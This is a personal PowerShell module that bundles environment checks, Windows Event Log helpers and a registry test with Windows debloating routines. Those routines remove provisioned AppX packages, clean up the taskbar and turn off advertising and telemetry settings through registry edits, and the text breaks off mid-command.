<#
Oracle
Written by Gregory F Martin

Oracle is a PowerShell Module that provides telemetry and reporting
functionality that is intended to be used in tandem with any other
script that is written by yours truly.

This site has useful information for registry values in PowerShell: https://mnaoumov.wordpress.com/2014/06/10/powershell-registry-set-itemproperty-gotchas/#:~:text=What%20is%20the%20list%20possible%20types%20%20,%20%20REG_MULTI_SZ%20%204%20more%20rows%20
#>

<# Script Globals #>
$EVENTLOG_SOURCE = 'Oracle'
$HOSTNAME = $env:COMPUTERNAME
$HOST_ONEDRIVEEXISTS = if($env:OneDrive -OR $env:OneDriveCOnsumer) { $true } else { $false }
$HOST_OS = $env:OS
$HOST_COMPINFO = Get-ComputerInfo # This would fail before the check for the version would even take place
$HOST_PSMODULEPATH = $env:PSModulePath
$HOST_SYSDRIVE = $env:SystemDrive
$HOST_SYSROOT = $env:SystemRoot
$HOST_MOUNTEDPSDRIVES = Get-PSDrive -Scope Global
$HOST_PSEDITION = $PSVersionTable.PSEdition
$HOST_PSVERSION = $PSVersionTable.PSVersion

$DEBUGMSG_ENTERFUN = "ENTERING FUNCTION :: "
$DEBUGMSG_LEAVEFUN = "LEAVING FUNCTION :: "

$ERRORMSG_OSCOMPAT = "FUNCTION CALL IS INCOMPATIBLE WITH THE CURRENT OPERATING SYSTEM! :: "
$ERRORMSG_PSECOMPAT = "FUNCTION CALL IS INCOMPATIBLE WITH THE CURRENT POWERSHELL EDITION! :: "
$ERRORMSG_PSVCOMPAT = "FUNCTION CALL IS INCOMPATIBLE WITH THE CURRENT POWERSHELL VERSION! :: "

$DEBUG = $false



<#
.SYNOPSIS
Enables debugging for Oracle. This will result in verbose output on the console.

.DESCRIPTION
This function is compatible with the following operating systems: Windows, Linux, Mac

This function is compatible with the following editions of PowerShell: Desktop, Core

This function is compatible with the following versions of PowerShell: All
#>
Function Enable-Debugging {
    Process {
        $DEBUG = $true
    }
}



<#
.SYNOPSIS
Disables debugging for Oracle. This will significantly reduce the output on the console.

.DESCRIPTION
This function is compatible with the following operating systems: Windows, Linux, Mac

This function is compatible with the following editions of PowerShell: Desktop, Core

This function is compatible with the following versions of PowerShell: All
#>
Function Disable-Debugging {
    Process {
        $DEBUG = $false
    }
}



<#
.SYNOPSIS
Checks to see if the host is running PowerShell 5 or greater.

.DESCRIPTION
This function is compatible with the following operating systems: Windows, Linux, Mac

This function is compatible with the following editions of PowerShell: Desktop, Core

This function is compatible with the following versions of PowerShell: All

Most of Oracle's functionality targets PowerShell 5 or greater. Computers that are running
a major version of PowerShell that are less than that will likely encounter problems executing
these functions. As of the current iteration of Oracle, when a function contains calls that
require a modern version of PowerShell, it will simply force termination of execution.

.OUTPUTS
True if the major version of PowerShell is 5 or greater, false otherwise.
#>
Function Assert-PSVersionModern {
    Begin {
        if($DEBUG -EQ $true) {
            Write-Host `
                "$DEBUGMSG_ENTERFUN Assert-DesktopPSEdition"
        }
    }
    Process {
        if($HOST_PSVERSION.Major -GE 5) {
            $true
        } else {
            $false
        }
    }
    End {
        if($DEBUG -EQ $true) {
            Write-Host `
                "$DEBUGMSG_LEAVEFUN Assert-DesktopPSEdition"
        }
    }
}



<#
.SYNOPSIS
Checks to see if the executing environment is the Desktop Edition of PowerShell (Windows PowerShell).

.DESCRIPTION
This function is compatible with the following operating systems: Windows, Linux, Mac

This function is compatible with the following editions of PowerShell: Desktop, Core

This function is compatible with the following versions of PowerShell: All

.OUTPUTS
True if the PowerShell Edition is Desktop, false otherwise.
#>
Function Assert-DesktopPSEdition {
    Begin {
        if($DEBUG -EQ $true) {
            Write-Host `
                "$DEBUGMSG_ENTERFUN Assert-DesktopPSEdition"
        }
    }
    Process {
        if(-NOT($HOST_PSEDITION -LIKE '*desktop*')) {
            $false
        } else {
            $true
        }
    }
    End {
        if($DEBUG -EQ $true) {
            Write-Host `
                "$DEBUGMSG_LEAVEFUN Assert-DesktopPSEdition"
        }
    }
}



<#
.SYNOPSIS
Checks to see if the executing environment is the Core Edition of PowerShell.

.DESCRIPTION
This function is compatible with the following operating systems: Windows, Linux, Mac

This function is compatible with the following editions of PowerShell: Desktop, Core

This function is compatible with the following versions of PowerShell: All

.OUTPUTS
True if the PowerShell Edition is Core, false otherwise.
#>
Function Assert-CorePSEdition {
    Begin {
        if($DEBUG -EQ $true) {
            Write-Host `
                "$DEBUGMSG_ENTERFUN Assert-CorePSEdition"
        }
    }
    Process {
        if(-NOT($HOST_PSEDITION -LIKE '*core*')) {
            $false
        } else {
            $true
        }
    }
    End {
        if($DEBUG -EQ $true) {
            Write-Host `
                "$DEBUGMSG_LEAVEFUN Assert-CorePSEdition"
        }
    }
}



<#
.SYNOPSIS
Checks to see if the executing operating system is Windows.

.DESCRIPTION
This function is compatible with the following operating systems: Windows, Linux, Mac

This function is compatible with the following editions of PowerShell: Desktop, Core

This function is compatible with the following versions of PowerShell: All

.OUTPUTS
True if the operating system is Windows, false otherwise.
#>
Function Assert-OSWindows {
    Begin {
        if($DEBUG -EQ $true) {
            Write-Host `
                "$DEBUGMSG_ENTERFUN Assert-OSWindows"
        }
    }
    Process {
        if(-NOT($HOST_OS -LIKE '*windows*')) {
            $false
        } else {
            $true
        }
    }
    End {
        if($DEBUG -EQ $true) {
            Write-Host `
                "$DEBUGMSG_LEAVEFUN Assert-OSWindows"
        }
    }
}



<#
.SYNOPSIS
Checks to see if the executing operating system is MacOS.

.DESCRIPTION
This function is compatible with the following operating systems: Windows, Linux, Mac

This function is compatible with the following editions of PowerShell: Desktop, Core

This function is compatible with the following versions of PowerShell: All

.OUTPUTS
True if the operating system is MacOS, false otherwise.
#>
Function Assert-OSMac {
    Begin {
        if($DEBUG -EQ $true) {
            Write-Host `
                "$DEBUGMSG_ENTERFUN Assert-OSMac"
        }
    }
    Process {
        if(-NOT($HOST_OS -LIKE '*mac*')) {
            $false
        } else {
            $true
        }
    }
    End {
        if($DEBUG -EQ $true) {
            Write-Host `
                "$DEBUGMSG_LEAVEFUN Assert-OSMac"
        }
    }
}



<#
.SYNOPSIS
Checks to see if the executing operating system is Linux.

.DESCRIPTION
This function is compatible with the following operating systems: Windows, Linux, Mac

This function is compatible with the following editions of PowerShell: Desktop, Core

This function is compatible with the following versions of PowerShell: All

.OUTPUTS
True if the operating system is Linux, false otherwise.
#>
Function Assert-OSLinux {
    Begin {
        if($DEBUG -EQ $true) {
            Write-Host `
                "$DEBUGMSG_ENTERFUN Assert-OSLinux"
        }
    }
    Process {
        if(-NOT($HOST_OS -LIKE '*linux*')) {
            $false
        } else {
            $true
        }
    }
    End {
        if($DEBUG -EQ $true) {
            Write-Host `
                "$DEBUGMSG_LEAVEFUN Assert-OSLinux"
        }
    }
}



<#
.SYNOPSIS
Creates an event log to use for writing logging information to in the Windows Event Logger.

.DESCRIPTION
This function is compatible with the following operating systems: Windows

This function is compatible with the following editions of PowerShell: Desktop, Core

This function is compatible with the following versions of PowerShell: All

Creates an Event Source in the Windows Event Logger to use for logging application events.

.PARAMETER LogName
The name of the event source to create.
#>
Function New-NamedEventLog {
    Param (
        [Parameter(Mandatory = $true, `
                    ValueFromPipeline = $true, `
                    ValueFromPipelineByPropertyName = $true, `
                    HelpMessage = 'Please provide the name of the Event Log Source to create.')]
        [String]$LogName
    )
    Begin {
        if($DEBUG -EQ $true) {
            Write-Host `
                "$DEBUGMSG_ENTERFUN New-NamedEventLog"
        }
        if(-NOT(Assert-OSWindows)) {
            Write-Error `
                -Message "$ERRORMSG_OSCOMPAT New-NamedEventLog"
            throw(New-Object `
                -TypeName System.PlatformNotSupportedException)
        }
    }
    Process {
        if(-NOT([System.Diagnostics.EventLog]::SourceExists($LogName))) {
            New-EventLog `
                -LogName Application `
                -Source $LogName
        }
    }
    End {
        if($DEBUG -EQ $true) {
            Write-Host `
                "$DEBUGMSG_LEAVEFUN New-NamedEventLog"
        }
    }
}



<#
.SYNOPSIS
Writes an informational message to the Windows Event Log.

.DESCRIPTION
This function is compatible with the following operating systems: Windows

This function is compatible with the following editions of PowerShell: Desktop, Core

This function is compatible with the following versions of PowerShell: All

.PARAMETER LogName
The name of the event source to write the log message to.

.PARAMETER Message
The string to write to the event log.
#>
Function Write-NamedEventLogInfo {
    Param (
        [Parameter(Mandatory = $true, `
                    ValueFromPipeline = $true, `
                    ValueFromPipelineByPropertyName = $true, `
                    HelpMessage = 'Please provide the name of the Event Log Source to use.')]
        [String]$LogName,
        [Parameter(Mandatory = $true, `
                    ValueFromPipeline = $true, `
                    ValueFromPipelineByPropertyName = $true, `
                    HelpMessage = 'Please provide the message to write to the Event Log Source.')]
        [String]$Message
    )
    Begin {
        if($DEBUG -EQ $true) {
            Write-Host `
                "$DEBUGMSG_ENTERFUN Write-NamedEventLogInfo"
        }
        if(-NOT(Assert-OSWindows)) {
            Write-Error `
                -Message "$ERRORMSG_OSCOMPAT Write-NamedEventLogInfo"
            throw(New-Object `
                -TypeName System.PlatformNotSupportedException)
        }
    }
    Process {
        Write-EventLog `
            -LogName Application `
            -Source $LogName `
            -EntryType Information `
            -EventId 1 `
            -Message $Message
    }
    End {
        if($DEBUG -EQ $true) {
            Write-Host `
                "$DEBUGMSG_LEAVEFUN Write-NamedEventLogInfo"
        }
    }
}



<#
.SYNOPSIS
Writes a warning message to the Windows Event Log.

.DESCRIPTION
This function is compatible with the following operating systems: Windows

This function is compatible with the following editions of PowerShell: Desktop, Core

This function is compatible with the following versions of PowerShell: All

.PARAMETER LogName
The name of the event source to write the log message to.

.PARAMETER Message
The string to write to the event log.
#>
Function Write-NamedEventLogWarn {
    Param (
        [Parameter(Mandatory = $true, `
                    ValueFromPipeline = $true, `
                    ValueFromPipelineByPropertyName = $true, `
                    HelpMessage = 'Please provide the name of the Event Log Source to use.')]
        [String]$LogName,
        [Parameter(Mandatory = $true, `
                    ValueFromPipeline = $true, `
                    ValueFromPipelineByPropertyName = $true, `
                    HelpMessage = 'Please provide the message to write to the Event Log Source.')]
        [String]$Message
    )
    Begin {
        if($DEBUG -EQ $true) {
            Write-Host `
                "$DEBUGMSG_ENTERFUN Write-NamedEventLogWarn"
        }
        if(-NOT(Assert-OSWindows)) {
            Write-Error `
                -Message "$ERRORMSG_OSCOMPAT Write-NamedEventLogWarn"
            throw(New-Object `
                -TypeName System.PlatformNotSupportedException)
        }
    }
    Process {
        Write-EventLog `
            -LogName Application `
            -Source $LogName `
            -EntryType Warning `
            -EventId 1 `
            -Message $Message
    }
    End {
        if($DEBUG -EQ $true) {
            Write-Host `
                "$DEBUGMSG_LEAVEFUN Write-NamedEventLogWarn"
        }
    }
}



<#
.SYNOPSIS
Writes an error message to the Windows Event Log.

.DESCRIPTION
This function is compatible with the following operating systems: Windows

This function is compatible with the following editions of PowerShell: Desktop, Core

This function is compatible with the following versions of PowerShell: All

.PARAMETER LogName
The name of the event source to write the log message to.

.PARAMETER Message
The string to write to the event log.
#>
Function Write-NamedEventLogError {
    Param (
        [Parameter(Mandatory = $true, `
                    ValueFromPipeline = $true, `
                    ValueFromPipelineByPropertyName = $true, `
                    HelpMessage = 'Please provide the name of the Event Log Source to use.')]
        [String]$LogName,
        [Parameter(Mandatory = $true, `
                    ValueFromPipeline = $true, `
                    ValueFromPipelineByPropertyName = $true, `
                    HelpMessage = 'Please provide the message to write to the Event Log Source.')]
        [String]$Message
    )
    Begin {
        if($DEBUG -EQ $true) {
            Write-Host `
                "$DEBUGMSG_ENTERFUN Write-NamedEventLogError"
        }
        if(-NOT(Assert-OSWindows)) {
            Write-Error `
                -Message "$ERRORMSG_OSCOMPAT Write-NamedEventLogError"
            throw(New-Object `
                -TypeName System.PlatformNotSupportedException)
        }
    }
    Process {
        Write-EventLog `
            -LogName Application `
            -Source $LogName `
            -EntryType Error `
            -EventId 1 `
            -Message $Message
    }
    End {
        if($DEBUG -EQ $true) {
            Write-Host `
                "$DEBUGMSG_LEAVEFUN Write-NamedEventLogError"
        }
    }
}



<#
.SYNOPSIS
Checks for a specified registry key.

.DESCRIPTION
This function is compatible with the following operating systems: Windows

This function is compatible with the following editions of PowerShell: Desktop, Core

This function is compatible with the following versions of PowerShell: All

A lot of this code was derived from other code on the interwebs. I'm still not sure what the PassThru thing does. I just know this works.
#>
Function Test-RegistryKey {
    Param (
        [Parameter(Mandatory = $true, `
                    ValueFromPipeline = $true, `
                    ValueFromPipelineByPropertyName = $true, `
                    HelpMessage = 'A valid path in the registry is required.')]
        [String]$RegistryPath,
        [Parameter(Mandatory = $true, `
                    ValueFromPipeline = $true, `
                    ValueFromPipelineByPropertyName = $true, `
                    HelpMessage = 'A key to test for in the registry is required.')]
        [String]$RegistryKey,
        [Switch]$PassThru
    )
    Begin {
        if($DEBUG -EQ $true) {
            Write-Host `
                "$DEBUGMSG_ENTERFUN Test-RegistryKey"
        }
        if(-NOT(Assert-OSWindows)) {
            Write-Error `
                -Message "$ERRORMSG_OSCOMPAT Test-RegistryKey"
            throw(New-Object `
                -TypeName System.PlatformNotSupportedException)
        }
    }
    Process {
        Write-HostInfo `
            -Message "Testing for registry key $RegistryPath\$RegistryKey"
        Write-EvLogInfo `
            -Message "Testing for registry key $RegistryPath\$RegistryKey"

        if(Test-Path -Path $RegistryPath) {
            $Key = Get-Item `
                    -LiteralPath $RegistryPath
            if($null -NE $Key.GetValue($RegistryKey, $null)) {
                if($PassThru) {
                    Get-ItemProperty $RegistryPath $RegistryKey
                } else {
                    Write-HostInfo  
                        -Message "Registry key $RegistryPath\$RegistryKey found."
                    $true
                }
            } else {
                Write-HostWarn `
                    -Message "Registry key $RegistryPath\$RegistryKey not found"
                $false
            }
        } else {
            Write-HostWarn `
                -Message "Registry key $RegistryPath\$RegistryKey not found"
            $false
        }
    }
    End {
        if($DEBUG -EQ $true) {
            Write-Host `
                "$DEBUGMSG_LEAVEFUN Test-RegistryKey"
        }
    }
}



<#
.SYNOPSIS
Checks to see if a specific RSAT feature is installed on the host.

.DESCRIPTION
This function is compatible with the following operating systems: Windows

This function is compatible with the following editions of PowerShell: Desktop, Core

This function is compatible with the following versions of PowerShell: 5.0 or greater

This function requires checking the current edition of Windows it's being run on. It accomplishes
this by using checking the value of ($Get-ComputerInfo).WindowsEditionId. If the value is that
of a server, it uses a different set of instructions than those for non-server editions.

.PARAMETER Feature
Specifies the specific RSAT feature to look for on the host. The value of this parameter
is constrained to the following variants:

 - ActiveDirectory
 - BitLocker
 - CertificateServices
 - DHCP
 - DNS
 - FailoverCluster
 - FileServices
 - GroupPolicy
 - IPAM
 - LLDP
 - NetworkController
 - NetworkLoadBalancing
 - RemoteDesktop
 - ServerManager
 - ShieldedVM
 - StorageMigrationService
 - StorageReplica
 - SystemInsights
 - VolumeActivation
 - WSUS

.OUTPUTS
False if the RSAT Feature isn't installed, true otherwise.
#>
Function Assert-RSATFeatureInstalled {
    Param (
        [ValidateSet("ActiveDirectory", `
                        "BitLocker", `
                        "CertificateServices", `
                        "DHCP", `
                        "DNS", `
                        "FailoverCluster", `
                        "FileServices", `
                        "GroupPolicy", `
                        "IPAM", `
                        "LLDP", `
                        "NetworkController", `
                        "NetworkLoadBalancing", `
                        "RemoteDesktop", `
                        "ServerManager", `
                        "ShieldedVM", `
                        "StorageMigrationService", `
                        "StorageReplica", `
                        "SystemInsights", `
                        "VolumeActiviation", `
                        "WSUS")]
        [Parameter(Mandatory = $true, `
                    ValueFromPipeline = $true, `
                    ValueFromPipelineByPropertyName = $true, `
                    HelpMessage = "Please provide the RSAT Feature that you wish to inquire about.")]
        [String]$Feature
    )
    Begin {
        if($DEBUG -EQ $true) {
            Write-Host `
                "$DEBUGMSG_ENTERFUN Assert-RSATFeatureInstalled"
        }
        if(-NOT(Assert-OSWindows)) {
            Write-Error `
                -Message "$ERRORMSG_OSCOMPAT Assert-RSATFeatureInstalled"
            throw(New-Object `
                -TypeName System.PlatformNotSupportedException)
        }
        if(-NOT(Assert-PSVersionModern)) {
        }
    }
    Process {
        if($HOST_COMPINFO.WindowsEditionId -LIKE '*server*') {
            $RFDetected = Get-WindowsFeature | Where-Object {$_.Name -LIKE $Feature}
        } else {
            $RFDetected = $(Get-WindowsCapability -Name "*$Feature*" -Online).State -LIKE '*notpresent*'
        }
        if($RFDetected -EQ 'False') {
            $false
        } else {
            $true
        }
    }
    End {
        if($DEBUG -EQ $true) {
            Write-Host `
                "$DEBUGMSG_LEAVEFUN Assert-RSATFeatureInstalled"
        }
    }
}



<#
.SYNOPSIS
Removes a handful of AppX Provisioned Packages from the computer, hopefully freeing up some garbage.

.DESCRIPTION
This function is compatible with the following operating systems: Windows

This function is compatible with the following editions of PowerShell: Desktop, Core

The current list of targeted AppX Provisioned Packages is as follows:

 - Microsoft.BingWeather
 - Microsoft.DesktopAppInstaller
 - Microsoft.GetHelp
 - Microsoft.Getstarted
 - Microsoft.Messaging
 - Microsoft.Microsoft3DViewer
 - Microsoft.MicrosoftOfficeHub
 - Microsoft.MicrosoftSolitaireCollection
 - Microsoft.MicrosoftStickyNotes
 - Microsoft.MixedReality.Portal
 - Microsoft.MSPaint
 - Microsoft.OneConnect
 - Microsoft.People
 - Microsoft.Print3D
 - Microsoft.Wallet
 - Microsoft.WindowsFeedbackApp
 - Microsoft.Xbox*
 - Microsoft.Zune*
 - Microsoft.WindowsMaps
 - Microsoft.YourPhone
 - Microsoft.549981C3F5F10
#>
Function Remove-AppXProvisioning {
    Begin {
        if($DEBUG -EQ $true) {
            Write-Host `
                "$DEBUGMSG_ENTERFUN Remove-AppXProvisioning"
        }
        if(-NOT(Assert-OSWindows)) {
            Write-Error `
                -Message "$ERRORMSG_OSCOMPAT Remove-AppXProvisioning"
            throw(New-Object `
                -TypeName System.PlatformNotSupportedException)
        }
    }
    Process {
        $caxp = Get-AppxProvisionedPackage -Online
        $removalTargets = @(
            'Microsoft.BingWeather',
            'Microsoft.DesktopAppInstaller',
            'Microsoft.GetHelp',
            'Microsoft.Getstarted',
            'Microsoft.Messaging',
            'Microsoft.Microsoft3DViewer',
            'Microsoft.MicrosoftOfficeHub',
            'Microsoft.MicrosoftSolitaireCollection',
            'Microsoft.MicrosoftStickyNotes',
            'Microsoft.MixedReality.Portal',
            'Microsoft.MSPaint',
            'Microsoft.OneConnect',
            'Microsoft.People',
            'Microsoft.Print3D',
            'Microsoft.Wallet',
            'Microsoft.WindowsFeedbackApp',
            'Microsoft.Xbox*',
            'Microsoft.Zune*',
            'Microsoft.WindowsMaps',
            'Microsoft.YourPhone',
            'Microsoft.549981C3F5F10' # Evidently this is Cortana
        )

        foreach ($axp in $caxp) {
            if($axp.DisplayName -IN $removalTargets -OR $axp.DisplayName -NOTLIKE 'Microsoft*') {
                Remove-AppxProvisionedPackage -PackageName $axp.PackageName -Online -AllUsers | Out-Null
            }
        }
    }
    End {
        if($DEBUG -EQ $true) {
            Write-Host `
                "$DEBUGMSG_LEAVEFUN Remove-AppXProvisioning"
        }
    }
}



<#
.SYNOPSIS
Cleans up the Taskbar.

.DESCRIPTION
This function is compatible with the following operating systems: Windows

This function is compatible with the following editions of PowerShell: Desktop, Core

This function performs the following operations:

 - Removes User and System Pins
 - Removes the News and Interests Feed
 - Removes Task View
 - Removes People
 - Removes Cortana
 - Change to Small Icons
 - Sets time to 24-hour format
 - Displays the Touch Keyboard
#>
Function Clear-Taskbar {
    Begin {
        if($DEBUG -EQ $true) {
            Write-Host `
                "$DEBUGMSG_ENTERFUN Clear-Taskbar"
        }
        if(-NOT(Assert-OSWindows)) {
            Write-Error `
                -Message "$ERRORMSG_OSCOMPAT Clear-Taskbar"
            throw(New-Object `
                -TypeName System.PlatformNotSupportedException)
        }
    }
    Process {
        # Taken from https://www.tenforums.com/tutorials/3151-reset-clear-taskbar-pinned-apps-windows-10-a.html
        # Delete the user's private entries and then remove the system ones
        Remove-Item `
            -Path "%AppData%\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar\*" `
            -Force | Out-Null
        Remove-Item `
            -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Taskband" `
            -Force | Out-Null

        # Hide the News and Interests Feed from the Taskbar
        New-ItemProperty `
            -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Feeds" `
            -Name "ShellFeedsTaskbarViewMode" `
            -Value 2 `
            -PropertyType DWORD `
            -Force | Out-Null

        # Remove the Task View icon from the Taskbar
        New-ItemProperty `
            -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced" `
            -Name "ShowTaskViewButton" `
            -Value 0 `
            -PropertyType DWORD `
            -Force | Out-Null

        # Remove the People icon from the Taskbar
        New-ItemProperty `
            -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\People" `
            -Name "PeopleBand" `
            -Value 0 `
            -PropertyType DWORD `
            -Force | Out-Null

        # Remove the Cortana icon from the Taskbar
        New-ItemProperty `
            -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced" `
            -Name "ShowCortanaButton" `
            -Value 0 `
            -PropertyType DWORD `
            -Force | Out-Null

        # Set the use of small icons in the Taskbar
        New-ItemProperty `
            -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced" `
            -Name "TaskbarSmallIcons" `
            -Value 1 `
            -PropertyType DWORD `
            -Force | Out-Null

        # Set the time to display in 24-hour format
        New-ItemProperty `
            -Path "HKCU:\Control Panel\International" `
            -Name "iTime" `
            -Value "1" `
            -PropertyType String `
            -Force | Out-Null
        New-ItemProperty `
            -Path "HKCU:\Control Panel\International" `
            -Name "iTLZero" `
            -Value "1" `
            -PropertyType String `
            -Force | Out-Null
        New-ItemProperty `
            -Path "HKCU:\Control Panel\International" `
            -Name "sShortTime" `
            -Value "HH:mm" `
            -PropertyType String `
            -Force | Out-Null
        New-ItemProperty `
            -Path "HKCU:\Control Panel\International" `
            -Name "sTimeFormat" `
            -Value "HH:mm:ss" `
            -PropertyType String `
            -Force | Out-Null

        # Set Touch Keyboard icon to display
        New-ItemProperty `
            -Path "HKCU:\SOFTWARE\Microsoft\TabletTip\1.7" `
            -Name "TipbandDesiredVisibility" `
            -Value 1 `
            -PropertyType DWORD `
            -Force | Out-Null
    }
    End {
        if($DEBUG -EQ $true) {
            Write-Host `
                "$DEBUGMSG_LEAVEFUN Clear-Taskbar"
        }
    }
}



<#
.SYNOPSIS
Works through most of the options in the Settings app and cleans house on them.

.DESCRIPTION
This function is compatible with the following operating systems: Windows

This function is compatible with the following editions of PowerShell: Desktop, Core
#>
Function Clear-Settings {
    Begin {
        if($DEBUG -EQ $true) {
            Write-Host `
                "$DEBUGMSG_ENTERFUN Clear-Settings"
        }
        if(-NOT(Assert-OSWindows)) {
            Write-Error `
                -Message "$ERRORMSG_OSCOMPAT Clear-Settings"
            throw(New-Object `
                -TypeName System.PlatformNotSupportedException)
        }
    }
    Process {
        # I'm not sure if these keys are the same for all users, but I'll run with them for the time being
        New-ItemProperty `
            -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" `
            -Name "SubscribedContent-338389Enabled" `
            -Value 0 `
            -PropertyType DWORD `
            -Force | Out-Null
        New-ItemProperty `
            -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" `
            -Name "SubscribedContent-310093Enabled" `
            -Value 0 `
            -PropertyType DWORD `
            -Force | Out-Null
        New-ItemProperty `
            -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\UserProfileEngagement" `
            -Name "ScoobeSystemSettingEnabled" `
            -Value 0 `
            -PropertyType DWORD `
            -Force | Out-Null

        # Focus Assist and Storage Sense don't appear to be registry-driven

        # Force Desktop Mode for desktops
        New-ItemProperty `
            -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\ImmersiveShell" `
            -Name "SignInMode" `
            -Value 1 `
            -PropertyType DWORD `
            -Force | Out-Null

        # Disable Timeline Suggestions
        New-ItemProperty `
            -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" `
            -Name "SubscribedContent-353698Enabled" `
            -Value 0 `
            -PropertyType DWORD `
            -Force | Out-Null

        # Make Alt+Tab be normal again
        New-ItemProperty `
            -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced" `
            -Name "MultiTaskingAltTabFilter" `
            -Value 3 `
            -PropertyType DWORD `
            -Force | Out-Null

        # Stop the Start Menu from selling you shit
        New-ItemProperty `
            -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" `
            -Name "SubscribedContent-338388Enabled" `
            -Value 0 `
            -PropertyType DWORD `
            -Force | Out-Null

        # Try to stop Xbox
        New-ItemProperty `
            -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" `
            -Name "SubscribedContent-353698Enabled" `
            -Value 0 `
            -PropertyType DWORD `
            -Force | Out-Null

        # Disable AutoPlay
        New-ItemProperty `
            -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\AutoplayHandlers" `
            -Name "DisableAutoplay" `
            -Value 0 `
            -PropertyType DWORD `
            -Force | Out-Null

        # Disable Hotspot 2.0
        New-ItemProperty `
            -Path "HKLM:\SOFTWARE\Microsoft\WlanSvc\AnqpCache" `
            -Name "OsuRegistrationStatus" `
            -Value 0 `
            -PropertyType DWORD `
            -Force | Out-Null

        # Disable Game Mode
        New-ItemProperty `
            -Path "HKCU:\SOFTWARE\Microsoft\GameBar" `
            -Name "AutoGameModeEnabled" `
            -Value 0 `
            -PropertyType DWORD `
            -Force | Out-Null

        # Set the SafeSearchMode
        # 0 = Disable, 1 = Moderate, 2 = Strict
        # Information gathered from https://technoresult.com/how-to-manage-safesearch-filter-settings-in-windows-10/#:~:text=Open%20windows%20settings%20by%20pressings%20windows%20%2B%20I,Enable%20or%20Disable%20the%20SafeSearch%20using%20Registry%20Editor.
        New-ItemProperty `
            -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\SearchSettings" `
            -Name "SafeSearchMode" `
            -Value 2 `
            -PropertyType DWORD `
            -Force | Out-Null
    }
    End {
        if($DEBUG -EQ $true) {
            Write-Host `
                "$DEBUGMSG_LEAVEFUN Clear-Settings"
        }
    }
}



<#
.SYNOPSIS
Attempts to clean up and stop as much of the advertising as possible.

.DESCRIPTION
This function is compatible with the following operating systems: Windows

This function is compatible with the following editions of PowerShell: Desktop, Core
#>
Function Clear-Advertising {
    Begin {
        if($DEBUG -EQ $true) {
            Write-Host `
                "$DEBUGMSG_ENTERFUN Clear-Advertising"
        }
        if(-NOT(Assert-OSWindows)) {
            Write-Error `
                -Message "$ERRORMSG_OSCOMPAT Clear-Advertising"
            throw(New-Object `
                -TypeName System.PlatformNotSupportedException)
        }
    }
    Process {
        # Disable app advertising ID
        New-ItemProperty `
            -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\AdvertisingInfo" `
            -Name "Enabled" `
            -Value 0 `
            -PropertyType DWORD `
            -Force | Out-Null
        Remove-ItemProperty `
            -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\AdvertisingInfo" `
            -Name "Id" `
            -Confirm $false `
            -Force | Out-Null

        # Disable website local content relevancy
        New-ItemProperty `
            -Path "HKCU:\Control Panel\International\User Profile" `
            -Name "HttpAcceptLanguageOptOut" `
            -Value 1 `
            -PropertyType DWORD `
            -Force | Out-Null
        Remove-ItemProperty `
            -Path "HKCU:\SOFTWARE\Microsoft\Internet Explorer\International" `
            -Name "AcceptLanguage" `
            -Confirm $false `
            -Force | Out-Null

        # Disable Windows App Launch Tracking (there may be a better way of doing this than through the registry)
        # I'm going to hold off on this particular aspect since it seems really nasty from a registry perspective.

        # Disable "Suggestions" in the Settings app
        New-ItemProperty `
            -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" `
            -Name "SubscribedContent-353694Enabled" `
            -Value 0 `
            -PropertyType DWORD `
            -Force | Out-Null
        New-ItemProperty `
            -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" `
            -Name "SubscribedContent-338393Enabled" `
            -Value 0 `
            -PropertyType DWORD `
            -Force | Out-Null
        New-ItemProperty `
            -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" `
            -Name "SubscribedContent-353969Enabled" `
            -Value 0 `
            -PropertyType DWORD `
            -Force | Out-Null

        # Disable Online Speech Recognition
        New-ItemProperty `
            -Path "HKCU:\SOFTWARE\Microsoft\Speech_OneCore\Settings\OnlineSpeechPrivacy" `
            -Name "HasAccepted" `
            -Value 0 `
            -PropertyType DWORD `
            -Force | Out-Null

        # Disable Inking and Typing Personalization
        # This ended up being a massive list of changes for the registry. I'm saving the diff, but want to look into this a little further to see if there's a better way of doing this.

        # Reduce Telemetry to minimal amount (this is for Home and Professional editions; these values may differ for Server editions)
        New-ItemProperty `
            -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Diagnostics\DiagTrack" `
            -Name "ShowedToastAtLevel" `
            -Value 1 `
            -PropertyType DWORD `
            -Force | Out-Null # I'm still not sure what this setting is for.
        New-ItemProperty `
            -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Diagnostics\DiagTrack" `
            -Name "DiagTrackAuthorization" `
            -Value 4871 `
            -PropertyType DWORD `
            -Force | Out-Null # I'm still not sure what this setting is for.
        New-ItemProperty `
            -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Diagnostics\DiagTrack\TraceManager" `
            -Name "MiniTraceSlotEnabled" `
            -Value 0 `
            -PropertyType DWORD `
            -Force | Out-Null # I'm still not sure what this setting is for.
        New-ItemProperty `
